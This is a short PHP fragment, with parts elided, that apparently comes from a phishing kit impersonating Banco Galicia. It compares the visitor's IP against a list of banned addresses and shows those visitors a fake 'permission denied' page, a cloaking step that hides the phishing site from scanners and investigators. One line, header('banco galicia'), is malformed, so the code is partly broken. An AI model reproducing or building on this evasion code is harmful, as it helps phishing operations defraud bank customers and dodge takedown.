...
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
    ...
    fclose($click);
    header('banco galicia');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>banco galicia</title></head><body><h1>galicia</h1><p>You dont have permission to access / on this server.</p></body></html>');  
} else {
